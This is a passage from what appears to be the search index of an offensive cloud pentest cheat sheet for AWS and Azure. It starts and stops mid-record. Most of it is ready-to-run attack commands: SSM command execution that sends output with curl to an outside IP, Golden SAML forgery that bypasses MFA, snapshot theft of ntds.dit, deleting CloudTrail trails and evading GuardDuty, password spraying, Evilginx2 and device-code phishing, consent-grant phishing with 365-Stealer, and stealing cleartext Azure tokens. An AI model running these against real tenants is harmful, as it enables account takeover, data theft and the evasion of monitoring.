aws ec2 describe-instances --profile uploadcreds --region eu-west-1 | jq \".[][].Instances | .[] | {InstanceId, KeyName, State}\" $ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE --availability-zone us-east-1d --instance-os-user ubuntu --ssh-public-key file://shortkey.pub --profile uploadcreds","title":"AWS - Instance Connect - Push an SSH key to EC2 instance"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-lambda-extract-functions-code","text":"# https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed $ aws lambda list-functions --profile uploadcreds $ aws lambda get-function --function-name \"LAMBDA-NAME-HERE-FROM-PREVIOUS-QUERY\" --query 'Code.Location' --profile uploadcreds $ wget -O lambda-function.zip url-from-previous-query --profile uploadcreds","title":"AWS - Lambda - Extract function's code"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-ssm-command-execution","text":":warning: The ssm-user account is not removed from the system when SSM Agent is uninstalled. SSM Agent is preinstalled, by default, on the following Amazon Machine Images (AMIs): * Windows Server 2008-2012 R2 AMIs published in November 2016 or later * Windows Server 2016 and 2019 * Amazon Linux * Amazon Linux 2 * Ubuntu Server 16.04 * Ubuntu Server 18.04 * Amazon ECS-Optimized $ aws ssm describe-instance-information --profile stolencreds --region eu-west-1 $ aws ssm send-command --instance-ids \"INSTANCE-ID-HERE\" --document-name \"AWS-RunShellScript\" --comment \"IP Config\" --parameters commands=ifconfig --output text --query \"Command.CommandId\" --profile stolencreds $ aws ssm list-command-invocations --command-id \"COMMAND-ID-HERE\" --details --query \"CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}\" --profile stolencreds e.g: $ aws ssm send-command --instance-ids \"i-05b\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588adaa\" --document-name \"AWS-RunShellScript\" --comment \"whoami\" --parameters commands='curl 162.243.\u2588\u2588\u2588.\u2588\u2588\u2588:8080/`whoami`' --output text --region=us-east-1","title":"AWS - SSM - Command execution"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-golden-saml-attack","text":"https://www.youtube.com/watch?v=5dj4vOqqGZw https://www.cyberark.com/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-cloud-apps/ Using the extracted information, the tool will generate a forged SAML token as an arbitrary user that can then be used to authenticate to Office 365 without knowledge of that user's password. This attack also bypasses any MFA requirements. Requirement: * Token-signing private key (export from personal store using Mimikatz) * IdP public certificate * IdP name * Role name (role to assume) $ python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml $ python .\\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012","title":"AWS - Golden SAML Attack"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-shadow-copy-attack","text":"Prerequisite: * EC2:CreateSnapshot * CloudCopy - https://github.com/Static-Flow/CloudCopy Load AWS CLI with Victim Credentials that have at least CreateSnapshot permissions Run \"Describe-Instances\" and show in list for attacker to select Run \"Create-Snapshot\" on volume of selected instance Run \"modify-snapshot-attribute\" on new snapshot to set \"createVolumePermission\" to attacker AWS Account Load AWS CLI with Attacker Credentials Run \"run-instance\" command to create new linux ec2 with our stolen snapshot Ssh run \"sudo mkdir /windows\" Ssh run \"sudo mount /dev/xvdf1 /windows/\" Ssh run \"sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user\" Ssh run \"sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user\" Ssh run \"sudo chown ec2-user:ec2-user /home/ec2-user/*\" SFTP get \"/home/ec2-user/SYSTEM ./SYSTEM\" SFTP get \"/home/ec2-user/ntds.dit ./ntds.dit\" locally run \"secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets' , expects secretsdump to be on path","title":"AWS - Shadow Copy attack"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#disable-cloudtrail","text":"$ aws cloudtrail delete-trail --name cloudgoat_trail --profile administrator Disable monitoring of events from global services $ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event Disable Cloud Trail on specific regions $ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event --no-is-multi-region --region=eu-west","title":"Disable CloudTrail"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#cover-tracks-by-obfuscating-cloudtrail-logs-and-guard-duty","text":":warning: When using awscli on Kali Linux, Pentoo and Parrot Linux, a log is generated based on the user-agent. Pacu bypass this problem by defining a custom User-Agent (https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu.py#L1473) boto3_session = boto3.session.Session() ua = boto3_session._session.user_agent() if 'kali' in ua.lower() or 'parrot' in ua.lower() or 'pentoo' in ua.lower(): # If the local OS is Kali/Parrot/Pentoo Linux # GuardDuty triggers a finding around API calls made from Kali Linux, so let's avoid that... self.print('Detected environment as one of Kali/Parrot/Pentoo Linux. Modifying user agent to hide that from GuardDuty...')","title":"Cover tracks by obfuscating Cloudtrail logs and Guard Duty"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#dynamodb","text":"Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It's a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second. list tables $ aws --endpoint-url http://s3.bucket.htb dynamodb list-tables { \"TableNames\": [ \"users\" ] } enumerate table content $ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[]' { \"password\": { \"S\": \"Management@#1@#\" }, \"username\": { \"S\": \"Mgmt\" } }","title":"DynamoDB"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#security-checks","text":"https://github.com/DenizParlak/Zeus Identity and Access Management Avoid the use of the \"root\" account Ensure multi-factor authentication (MFA) is enabled for all IAM users that have a console password Ensure credentials unused for 90 days or greater are disabled Ensure access keys are rotated every 90 days or less Ensure IAM password policy requires at least one uppercase letter Ensure IAM password policy requires at least one lowercase letter Ensure IAM password policy requires at least one symbol Ensure IAM password policy requires at least one number Ensure IAM password policy requires minimum length of 14 or greater Ensure no root account access key exists Ensure MFA is enabled for the \"root\" account Ensure security questions are registered in the AWS account Ensure IAM policies are attached only to groups or role Enable detailed billing Maintain current contact details Ensure security contact information is registered Ensure IAM instance roles are used for AWS resource access from instances Logging Ensure CloudTrail is enabled in all regions Ensure CloudTrail log file validation is enabled Ensure the S3 bucket CloudTrail logs to is not publicly accessible Ensure CloudTrail trails are integrated with CloudWatch Logs Ensure AWS Config is enabled in all regions Ensure S3 bucket access logging is enabled on the CloudTrail S3 bucket Ensure CloudTrail logs are encrypted at rest using KMS CMKs Ensure rotation for customer created CMKs is enabled Networking Ensure no security groups allow ingress from 0.0.0.0/0 to port 22 Ensure no security groups allow ingress from 0.0.0.0/0 to port 3389 Ensure VPC flow logging is enabled in all VPC Ensure the default security group of every VPC restricts all traffic Monitoring Ensure a log metric filter and alarm exist for unauthorized API calls Ensure a log metric filter and alarm exist for Management Consolesign-in without MFA Ensure a log metric filter and alarm exist for usage of \"root\" account Ensure a log metric filter and alarm exist for IAM policy changes Ensure a log metric filter and alarm exist for CloudTrail configuration changes Ensure a log metric filter and alarm exist for AWS Management Console authentication failures Ensure a log metric filter and alarm exist for disabling or scheduled deletion of customer created CMKs Ensure a log metric filter and alarm exist for S3 bucket policy changes Ensure a log metric filter and alarm exist for AWS Config configuration changes Ensure a log metric filter and alarm exist for security group changes Ensure a log metric filter and alarm exist for changes to NetworkAccess Control Lists (NACL) Ensure a log metric filter and alarm exist for changes to network gateways Ensure a log metric filter and alarm exist for route table changes Ensure a log metric filter and alarm exist for VPC changes","title":"Security checks"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#references","text":"An introduction to penetration testing AWS - Graceful Security Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk My arsenal of AWS Security tools - toniblyx AWS Privilege Escalation method mitigation - RhinoSecurityLabs AWS CLI Cheatsheet - apolloclark Pacu Open source AWS Exploitation framework - RhinoSecurityLabs PACU Spencer Gietzen - 30 juil. 2018 Cloud security instance metadata - PumaScan Privilege escalation in the Cloud: From SSRF to Global Account Administrator - Maxime Leblanc - Sep 1, 2018 AWS - Cheatsheet - @Magnussen amazon-guardduty-user-guide PenTest Finding Types - @awsdocs HOW I HACKED A WHOLE EC2 NETWORK DURING A PENETRATION TEST - by Federico Fernandez How to Attach and Mount an EBS volume to EC2 Linux Instance - AUGUST 17, 2016 Getting shell and data access in AWS by chaining vulnerabilities - Riyaz Walikar - Aug 29, 2019 Getting started with Version 2 of AWS EC2 Instance Metadata service (IMDSv2) - Sunesh Govindaraj - Nov 25, 2019 Gaining AWS Console Access via API Keys - Ian Williams - March 18th, 2020 AWS API calls that return credentials - kmcquade","title":"References"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/","text":"Azure Active Directory Summary Azure Recon Tools Terminology Enumeration Enumerate valid emails Enumerate Azure Subdomains Enumerate tenant with Azure AD Powershell Enumerate tenant with Az Powershell Enumerate tenant with az cli Enumerate manually Enumeration methodology Phishing with Evilginx2 Illicit Consent Grant Register Application Configure Application Setup 365-Stealer (Deprecated) Setup Vajra Device Code Phish Token from Managed Identity Azure API via Powershell Azure API via Python Version Get Tokens Use Tokens Refresh Tokens Stealing Tokens Stealing tokens from az cli Stealing tokens from az powershell Add Credentials to All Enterprise Applications Spawn SSH for Azure Web App Azure Storage Blob Enumerate blobs SAS URL List and download blobs Runbook Automation Create a Runbook Persistence via Automation accounts Virtual Machine RunCommand KeyVault Secrets Pass The Certificate Pass The PRT Intunes Administration Dynamic Group Membership Administrative Unit Deployment Template Application Proxy Conditional Access Azure AD Azure AD vs Active Directory Password Spray Convert GUID to SID Azure AD Connect Azure AD Connect - Password extraction Azure AD Connect - MSOL Account's password and DCSync Azure AD Connect - Seamless Single Sign On Silver Ticket References Azure Recon Tools ROADTool powershell pipenv shell roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout] roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa] roadrecon auth -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD> roadrecon gather roadrecon gui StormSpotter ```powershell # https://github.com/Azure/Stormspotter session 1 - backend pipenv shell python ssbackend.pyz session 2 - frontend cd C:\\Tools\\stormspotter\\frontend\\dist\\spa\\ quasar.cmd serve -p 9091 --history session 3 - collector pipenv shell az login -u test@ .onmicrosoft.com -p python C:\\Tools\\stormspotter\\stormcollector\\sscollector.pyz cli Web access on http://localhost:9091 Username: neo4j Password: BloodHound Server: bolt://localhost:7687 * **Azure Hound** powershell https://github.com/BloodHoundAD/AzureHound . C:\\Tools\\AzureHound\\AzureHound.ps1 Invoke-AzureHound -Verbose GUI access bolt://localhost:7687 Username: neo4j Password: BloodHound Cypher query example: MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p Change object ID's to names in Bloodhound MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> \"\" AND n.name IS NULL SET n.name = n.azname Custom Queries : https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/ * List of Microsoft portals: https://msportals.io/ * **Azucar** : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks. powershell You should use an account with at least read-permission on the assets you want to access git clone https://github.com/nccgroup/azucar.git PS> Get-ChildItem -Recurse c:\\Azucar_V10 | Unblock-File PS> .\\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT PS> .\\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\\AzucarTest\\server.pfx -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 PS> .\\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\\AzucarTest\\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 resolve the TenantID for an specific username PS> .\\Azucar.ps1 -ResolveTenantUserName user@company.com * **Azurite Explorer** and **Azurite Visualizer** : Enumeration and reconnaissance activities in the Microsoft Azure Cloud. powershell git clone https://github.com/mwrlabs/Azurite.git git clone https://github.com/FSecureLABS/Azurite git submodule init git submodule update PS> Import-Module AzureRM PS> Import-Module AzuriteExplorer.ps1 PS> Review-AzureRmSubscription PS> Review-CustomAzureRmSubscription * **MicroBurst** - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping powershell $ git clone https://github.com/NetSPI/MicroBurst PS C:> Import-Module .\\MicroBurst.psm1 PS C:> Import-Module .\\Get-AzureDomainInfo.ps1 PS C:> Get-AzureDomainInfo -folder MicroBurst -Verbose ``` * SkyArk - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins. Require: - Read-Only permissions over Azure Directory (Tenant) - Read-Only permissions over Subscription - Require AZ and AzureAD module or administrator right ```powershell $ git clone https://github.com/cyberark/SkyArk $ powershell -ExecutionPolicy Bypass -NoProfile PS C> Import-Module .\\SkyArk.ps1 -force PS C> Start-AzureStealth or in the Cloud Console PS C> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1') PS C> Scan-AzureAdmins PowerZure * - ```powershell require az module ! $ git clone https://github.com/hausec/PowerZure $ ipmo .\\PowerZure $ Set-Subscription -Id [idgoeshere] Reader $ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails Contributor $ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command \"whoami\" $ Execute-MSBuild -VM Win10Test -ResourceGroup Test-RG -File \"build.xml\" $ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents $ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine's disk Owner $ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest Administrator $ Create-Backdoor, Execute-Backdoor ``` Terminology Basic Azure AD terminologies Tenant : An instance of Azure AD and represents a single organization. Azure AD Directory : Each tenant has a dedicated Directory. This is used to perform identity and access management functions for resources. Subscriptions : It is used to pay for services. There can be multiple subscriptions in a Directory. Core Domain : The initial domain name .onmicrosoft.com is the core domain. It is possible to define custom domain names too. Enumeration Enumerate valid emails By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute. Validate email powershell PS> C:\\Python27\\python.exe C:\\Tools\\o365creeper\\o365creeper.py -f C:\\Tools\\emails.txt -o C:\\Tools\\validemails.txt admin@<TENANT NAME>.onmicrosoft.com - VALID root@<TENANT NAME>.onmicrosoft.com - INVALID test@<TENANT NAME>.onmicrosoft.com - VALID contact@<TENANT NAME>.onmicrosoft.com - INVALID Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon Password spraying PS> . C:\\Tools\\MSOLSpray\\MSOLSpray.ps1 PS> Invoke-MSOLSpray -UserList C:\\Tools\\validemails.txt -Password <PASSWORD> -Verbose Enumerate Azure Subdomains PS> . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureSubDomains.ps1 PS> Invoke-EnumerateAzureSubDomains -Base <TENANT NAME> -Verbose Subdomain Service --------- ------- <TENANT NAME>.mail.protection.outlook.com Email <TENANT NAME>.onmicrosoft.com Microsoft Hosted Domain Enumerate tenant with Azure AD Powershell Import-Module C:\\Tools\\AzureAD\\AzureAD.psd1 Import-Module C:\\Tools\\AzureADPreview\\AzureADPreview.psd1 PS> $passwd = ConvertTo-SecureString \"<PASSWORD>\" -AsPlainText -Force PS> $creds = New-Object System.Management.Automation.PSCredential(\"test@<TENANT NAME>.onmicrosoft.com\", $passwd) PS Az> Connect-AzureAD -Credential $creds PS AzureAD> Get-AzureADUser -All $true PS AzureAD> Get-AzureADUser -All $true | select UserPrincipalName PS AzureAD> Get-AzureADGroup -All $true PS AzureAD> Get-AzureADDevice PS AzureAD> Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Administrator'\" | Get-AzureADDirectoryRoleMember PS AzureADPreview> Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName Enumerate tenant with Az Powershell PS> $passwd = ConvertTo-SecureString \"<PASSWORD>\" -AsPlainText -Force PS> $creds = New-Object System.Management.Automation.PSCredential (\"test@<TENANT NAME>.onmicrosoft.com\", $passwd) PS Az> Connect-AzAccount -Credential $creds PS Az> Get-AzResource PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>.onmicrosoft.com PS Az> Get-AzVM | fl PS Az> Get-AzWebApp | ?{$_.Kind -notmatch \"functionapp\"} PS Az> Get-AzFunctionApp PS Az> Get-AzStorageAccount | fl PS Az> Get-AzKeyVault Enumerate tenant with az cli PS> az login -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD> PS> az vm list PS> az vm list --query \"[].[name]\" -o table PS> az webapp list PS> az functionapp list --query \"[].[name]\" -o table PS> az storage account list PS> az keyvault list Enumerate manually Federation with Azure AD or O365 powershell https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1 https://login.microsoftonline.com/getuserrealm.srf?login=root@<TENANT NAME>.onmicrosoft.com&xml=1 Get the Tenant ID powershell https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration https://login.microsoftonline.com/<TENANT NAME>.onmicrosoft.com/.well-known/openid-configuration Enumeration methodology # Check Azure Joined PS> dsregcmd.exe /status +----------------------------------------------------------------------+ | Device State | +----------------------------------------------------------------------+ AzureAdJoined : YES EnterpriseJoined : NO DomainJoined : NO Device Name : jumpvm # Enumerate resources PS Az> Get-AzResource # Enumerate role assignments PS Az> Get-AzRoleAssignment -Scope /subscriptions/<SUBSCRIPTION-ID>/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/<VM-NAME>` # Get info on a role PS Az> Get-AzRoleDefinition -Name \"Virtual Machine Command Executor\" # Get info user PS AzureAD> Get-AzureADUser -ObjectId <ID> PS AzureAD> Get-AzureADUser -ObjectId test@<TENANT NAME>.onmicrosoft.com | fl * # List all groups PS AzureAD> Get-AzureADGroup -All $true # Get members of a group PS Az> Get-AzADGroup -DisplayName '<GROUP-NAME>' PS Az> Get-AzADGroupMember -GroupDisplayName '<GROUP-NAME>' | select UserPrincipalName # Get Azure AD information PS> Import-Module C:\\Tools\\AADInternals\\AADInternals.psd1 PS AADInternals> Get-AADIntLoginInformation -UserName admin@<TENANT NAME>.onmicrosoft.com PS AADInternals> Get-AADIntTenantID -Domain <TENANT NAME>.onmicrosoft.com # Get Tenant ID PS AADInternals> Invoke-AADIntReconAsOutsider -DomainName <DOMAIN> # Get all the information # Check if there is a user logged-in to az cli PS> az ad signed-in-user show # Check AppID Alternative Names/Display Name PS AzureAD> Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq \"<APP-ID>\"} | fl # Get all application objects registered using the current tenant PS AzureAD> Get-AzureADApplication -All $true # Get all details about an application PS AzureAD> Get-AzureADApplication -ObjectId <ID> | fl * # List all VM's the user has access to PS Az> Get-AzVM PS Az> Get-AzVM | fl # Get all function apps PS Az> Get-AzFunctionApp # Get all webapps PS Az> Get-AzWebApp PS Az> Get-AzWebApp | select-object Name, Type, Hostnames # List all storage accounts PS Az> Get-AzStorageAccount PS Az> Get-AzStorageAccount | fl # List all keyvaults PS Az> Get-AzKeyVault Phishing with Evilginx2 PS C:\\Tools> evilginx2 -p C:\\Tools\\evilginx2\\phishlets : config domain username.corp : config ip 10.10.10.10 : phishlets hostname o365 login.username.corp : phishlets get-hosts o365 Create a DNS entry for login.login.username.corp and www.login.username.corp, type A, pointing to your machine # copy certificate and enable the phishing PS C:\\Tools> Copy-Item C:\\Users\\Username\\.evilginx\\crt\\ca.crt C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.crt PS C:\\Tools> Copy-Item C:\\Users\\Username\\.evilginx\\crt\\private.key C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.key : phishlets enable o365 # get the phishing URL : lures create o365 : lures get-url 0 Illicit Consent Grant The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to. Check if users are allowed to consent to apps: PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole * Disable user consent : Users cannot grant permissions to applications. * Users can consent to apps from verified publishers or your organization, but only for permissions you select : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant * Users can consent to all apps : allows all users to consent to any permission which doesn't require admin consent, * Custom app consent policy Register Application Login to https://portal.azure.com > Azure Active Directory Click on App registrations > New registration Enter the Name for our application Under support account types select \"Accounts in any organizational directory (Any Azure AD directory - Multitenant)\" Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is https://<DOMAIN/IP>:<PORT>/login/authorized . Click Register and save the Application ID Configure Application Click on Certificates & secrets Click on New client secret then enter the Description and click on Add . Save the secret 's value. Click on API permissions > Add a permission Click on Microsoft Graph > Delegated permissions Search and select the below mentioned permissions and click on Add permission Contacts.Read Mail.Read / Mail.ReadWrite Mail.Send Notes.Read.All Mailboxsettings.ReadWrite Files.ReadWrite.All User.ReadBasic.All User.Read Setup 365-Stealer (Deprecated) :warning: Default port for 365-Stealer phishing is 443 Run XAMPP and start Apache Clone 365-Stealer into C:\\xampp\\htdocs\\ git clone https://github.com/AlteredSecurity/365-Stealer.git Install the requirements Python3 PHP CLI or Xampp server pip install -r requirements.txt Enable sqlite3 (Xampp > Apache config > php.ini) and restart Apache Edit C:/xampp/htdocs/yourvictims/index.php if needed Disable IP whitelisting $enableIpWhiteList = false; Go to 365-Stealer Management portal > Configuration (http://localhost:82/365-stealer/yourVictims) Client Id (Mandatory): This will be the Application(Client) Id of the application that we registered. Client Secret (Mandatory): Secret value from the Certificates & secrets tab that we created. Redirect URL (Mandatory): Specify the redirect URL that we entered during registering the App like https://<Domain/IP>/login/authorized Macros Location : Path of macro file that we want to inject. Extension in OneDrive : We can provide file extensions that we want to download from the victims account or provide * to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. Delay : Delay the request by specifying time in seconds while stealing Create a Self Signed Certificate to use HTTPS Run the application either click on the button or run this command : python 365-Stealer.py --run-app --no-ssl : disable HTTPS --port : change the default listening port --token : provide a specific token --refresh-token XXX --client-id YYY --client-secret ZZZ : use a refresh token Find the Phishing URL: go to https://<IP/Domain>:<Port> and click on Read More button or in the console. Setup Vajra Vajra is a UI-based tool with multiple techniques for attacking and enumerating in the target's Azure environment. It features an intuitive web-based user interface built with the Python Flask module for a better user experience. The primary focus of this tool is to have different attacking techniques all at one place with web UI interfaces. - https://github.com/TROUBLE-1/Vajra Mitigation : Enable Do not allow user consent for applications in the \"Consent and permissions menu\". Device Code Phish Requirements: * Azure AD / Office 365 E3 Subscription Exploitation: Import TokenTactics: PS C:\\TokenTactics> Import-Module .\\TokenTactics.psd1 Request a device code for the Azure Graph API using TokenTactics: Get-AzureToken -Client Graph Replace <REPLACE-WITH-DEVCODE-FROM-TOKENTACTICS> in the phishing email Leave TokenTactics running in the PowerShell window and send the phishing email Targeted user will follow the link to https://microsoft.com/devicelogin and complete the Device Code form Enjoy your Access Token & Refresh Token Token from Managed Identity MSI_ENDPOINT is an alias for IDENTITY_ENDPOINT , and MSI_SECRET is an alias for IDENTITY_HEADER . Find IDENTITY_HEADER and IDENTITY_ENDPOINT from the environment : env Most of the time, you want a token for one of these resources: * https://storage.azure.com * https://vault.azure.net * https://graph.microsoft.com * https://management.azure.com Azure API via Powershell Get access_token from IDENTITY_HEADER and IDENTITY_ENDPOINT : system('curl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01\" -H secret:$IDENTITY_HEADER'); . Then query the Azure REST API to get the subscription ID and more . $Token = 'eyJ0eX..' $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01' # $URI = 'https://graph.microsoft.com/v1.0/applications' $RequestParams = @{ Method = 'GET' Uri = $URI Headers = @{ 'Authorization' = \"Bearer $Token\" } } (Invoke-RestMethod @RequestParams).value # List resources and check for runCommand privileges $URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01' $URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/<RG-NAME>/providers/Microsoft.Compute/virtualMachines/<RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01' Azure API via Python Version IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT'] IDENTITY_HEADER = os.environ['IDENTITY_HEADER'] print(\"[+] Management API\") cmd = 'curl \"%s?resource=https://management.azure.com/&api-version=2017-09-01\" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() print(\"Access Token: \"+json.loads(val)[\"access_token\"]) print(\"ClientID/AccountID: \"+json.loads(val)[\"client_id\"]) print(\"\\r\\n[+] Graph API\") cmd = 'curl \"%s?resource=https://graph.microsoft.com/&api-version=2017-09-01\" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() print(json.loads(val)[\"access_token\"]) print(\"ClientID/AccountID: \"+json.loads(val)[\"client_id\"]) or inside a Python Function: import logging, os import azure.functions as func def main(req: func.HttpRequest) -> func.HttpResponse: logging.info('Python HTTP trigger function processed a request.') IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT'] IDENTITY_HEADER = os.environ['IDENTITY_HEADER'] cmd = 'curl \"%s?resource=https://management.azure.com&apiversion=2017-09-01\" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() return func.HttpResponse(val, status_code=200) Get Tokens :warning: The lifetime of a Primary Refresh Token is 14 days! # az cli - get tokens az account get-access-token az account get-access-token --resource-type aad-graph # or Az (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token # or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT Use Tokens Tokens contain all the claims including that for MFA and Conditional Access Az Powershell ```powershell PS C:\\Tools> $token = 'eyJ0e..' PS C:\\Tools> Connect-AzAccount -AccessToken $token -AccountId Access Token and Graph Token PS C:\\Tools> $token = 'eyJ0eX..' PS C:\\Tools> $graphaccesstoken = 'eyJ0eX..' PS C:\\Tools> Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId PS C:\\Tools> Get-AzResource ERROR: 'this.Client.SubscriptionId' cannot be null. ---> The managed identity has no rights on any of the Azure resources. Switch to to GraphAPI * AzureAD powershell Import-Module C:\\Tools\\AzureAD\\AzureAD.psd1 $AADToken = 'eyJ0\u2026' Connect-AzureAD -AadAccessToken $AADToken -TenantId -AccountId ``` Refresh Tokens https://github.com/ConstantinT/Lantern powershell Lantern.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz> Lantern.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename <Name> --outpfxfile <Some path> Lantern.exe token --username <Username> --password <Password> Lantern.exe token --refreshtoken <RefreshToken> Lantern.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password ) https://github.com/rvrsh3ll/TokenTactics powershell Import-Module .\\TokenTactics.psd1 CommandType Name Version Source ----------- ---- ------- ------ Function Clear-Token 0.0.1 TokenTactics Function Dump-OWAMailboxViaMSGraphApi 0.0.1 TokenTactics Function Forge-UserAgent 0.0.1 TokenTactics Function Get-AzureToken 0.0.1 TokenTactics Function Get-TenantID 0.0.1 TokenTactics Function Open-OWAMailboxInBrowser 0.0.1 TokenTactics Function Parse-JWTtoken 0.0.1 TokenTactics Function RefreshTo-AzureCoreManagementToken 0.0.1 TokenTactics Function RefreshTo-AzureManagementToken 0.0.1 TokenTactics Function RefreshTo-DODMSGraphToken 0.0.1 TokenTactics Function RefreshTo-GraphToken 0.0.1 TokenTactics Function RefreshTo-MAMToken 0.0.1 TokenTactics Function RefreshTo-MSGraphToken 0.0.1 TokenTactics Function RefreshTo-MSManageToken 0.0.1 TokenTactics Function RefreshTo-MSTeamsToken 0.0.1 TokenTactics Function RefreshTo-O365SuiteUXToken 0.0.1 TokenTactics Function RefreshTo-OfficeAppsToken 0.0.1 TokenTactics Function RefreshTo-OfficeManagementToken 0.0.1 TokenTactics Function RefreshTo-OutlookToken 0.0.1 TokenTactics Function RefreshTo-SubstrateToken 0.0.1 TokenTactics Stealing Tokens Get-AzurePasswords powershell Import-Module Microburst.psm1 Get-AzurePasswords Get-AzurePasswords -Verbose | Out-GridView Stealing tokens from az cli az cli stores access tokens in clear text in accessTokens.json in the directory C:\\Users\\<username>\\.Azure azureProfile.json in the same directory contains information about subscriptions. Stealing tokens from az powershell Az PowerShell stores access tokens in clear text in TokenCache.dat in the directory C:\\Users\\<username>\\.Azure It also stores ServicePrincipalSecret in clear-text in AzureRmContext.json Users can save tokens using Save-AzContext Add credentials to all Enterprise Applications # Add secrets PS > . C:\\Tools\\Add-AzADAppSecret.ps1 PS > Add-AzADAppSecret -GraphToken $graphtoken -Verbose # Use secrets to authenticate as Service Principal PS > 